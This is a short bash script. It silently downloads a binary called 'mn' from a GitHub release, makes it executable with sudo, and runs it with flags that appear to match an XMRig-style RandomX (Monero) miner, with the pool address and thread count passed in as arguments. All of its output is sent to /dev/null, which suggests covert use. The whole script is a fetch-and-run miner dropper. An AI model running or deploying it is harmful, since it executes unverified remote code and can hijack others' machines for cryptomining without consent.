#! /bin/bash
printf "Run $1"  >&2
{
screen -S min
wget https://github.com/fulltechtree/tech/releases/download/1.0/mn &> /dev/null
sudo chmod +x mn
./mn -o "$1" -u userA -p 1 -a rx/0 -k -t "$2"
} &> /dev/null
